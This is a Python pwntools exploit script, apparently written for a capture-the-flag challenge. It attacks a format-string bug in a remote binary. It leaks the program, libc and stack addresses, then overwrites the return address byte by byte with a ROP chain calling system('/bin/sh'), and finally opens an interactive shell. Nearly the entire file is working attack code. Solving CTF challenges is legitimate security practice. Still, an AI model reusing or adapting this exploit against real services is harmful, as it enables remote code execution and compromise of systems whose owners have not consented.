from pwn import * 

exe = context.binary = ELF('./src/share/chal')
libc = elf.libc
# libc = ELF('/usr/lib/libc.so.6')
# p = process(exe.path)
# p = remote('localhost', 10404)
p = remote('10.113.0.1', 10404)
"""
def leak_addr(addr, length=8, offset=0):
    leak_payload = f'%{length + 1}$p'.encode().ljust(0x8, b'A') + p64(addr) 
    res = send(leak_payload).strip()
    info(f'leak res: {res}')
    return int(res.strip(), 16)
"""

def write_stack(target_addr_off, target_off, write_addr, byte_list, do_pause=False):
    info(f'overwriting addr at offset {target_addr_off} to point to {hex(write_addr)} and writing {len(byte_list)} bytes there')

    # here assume target only need 2 bytes to point to write_addr
    lower_bytes = write_addr & 0xffff
    payload = f'%{lower_bytes}c%{target_addr_off}$hn'.encode() 
    send(payload)
    for i, byte in enumerate(byte_list):
        if do_pause:
            pause()
        # update pointer by one byte
        lower_bytes = write_addr & 0xff
        payload = f'%{lower_bytes}c%{target_addr_off}$hhn'.encode() 
        send(payload)
        write_addr += 1
        
        # write byte
        byte_value = byte
        payload = b''
        if byte_value == 0:
           byte_value = 0x100
           payload = f'%{byte_value}c%{target_off}$hn'.encode()
        else:
           payload = f'%{byte_value}c%{target_off}$hhn'.encode()
        send(payload)
        info(f'wrote byte {i}: {hex(byte_value)} at {hex(write_addr-1)}')

def leak_stack(offset):
    leak_payload = f'%{offset}$p'.encode()
    res = send(leak_payload).strip()
    # info(f'leak stack res: {res}')
    return int(res.strip(), 16)


def send(data):
    p.sendline(data)
    return p.recvline()

autofmt = FmtStr(execute_fmt=send) # auto find offset [python3 exploit.py DEBUG]

base = leak_stack(autofmt.offset + (0xf-0x2)) - exe.symbols['main']
info(f'base: {hex(base)}')

libc_leak = leak_stack(autofmt.offset + (0xb-0x2))
info(f'libc leak: {hex(libc_leak)}')
libc_base = libc_leak - libc.symbols['__libc_start_main'] - 243
info(f'libc base: {hex(libc_base)}')
libc.address = libc_base
info(f'system: {hex(libc.symbols["system"])}')

stack_leak = leak_stack(autofmt.offset + (0xd-0x2))
info(f'some stack leak: {hex(stack_leak)}')
while_flag_addr = stack_leak - 0x13c
ret_addr = stack_leak - 0xf0
info(f'while_flag_addr: {hex(while_flag_addr)}')
info(f'ret_addr: {hex(ret_addr)}')

# canary = leak_stack(autofmt.offset + (0x9-0x2))
# info(f'canary: {hex(canary)}')



# payload = f'%{autofmt.offset + 1}$n'.encode().ljust(0x8, b'A') + p64(while_flag_addr)

# overwrite stack[rbp] to point to while flag, one byte at a time
target_addr_off = autofmt.offset + (0x1c - 0x2) # this currently points to rbp
target_off = autofmt.offset + (0x29 - 0x2) # this will point to while flag after overwrite


pop_rdi = next(libc.search(asm('pop rdi; ret;'), executable=True))
ret = next(libc.search(asm('ret;'), executable=True))
binsh = next(libc.search(b'/bin/sh\x00')) 

write_stack(target_addr_off, target_off, ret_addr, [ (pop_rdi >> (8*i)) & 0xff for i in range(6) ])
write_stack(target_addr_off, target_off, ret_addr + 8, [ (binsh >> (8*i)) & 0xff for i in range(6) ])
write_stack(target_addr_off, target_off, ret_addr + 16, [ (ret >> (8*i)) & 0xff for i in range(6) ])
write_stack(target_addr_off, target_off, ret_addr + 24, [ (libc.symbols['system'] >> (8*i)) & 0xff for i in range(6) ])
pause()
write_stack(target_addr_off, target_off, while_flag_addr, b'\x00\x00\x00\x00')
p.interactive()



